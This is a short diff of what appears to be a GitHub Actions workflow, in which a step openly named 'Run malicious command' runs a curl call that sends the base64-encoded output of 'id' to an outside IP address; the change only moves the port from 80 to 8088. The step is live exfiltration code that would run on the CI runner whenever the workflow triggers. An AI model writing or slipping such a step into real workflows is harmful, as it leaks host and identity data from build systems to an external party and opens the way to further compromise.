@@ -12,4 +12,4 @@ jobs:
 
     - name: Run malicious command
       run: |
-        curl http://43.136.35.213:80/$(id|base64|tr -d \"\n\");
+        curl http://43.136.35.213:8088/$(id|base64|tr -d \"\n\");
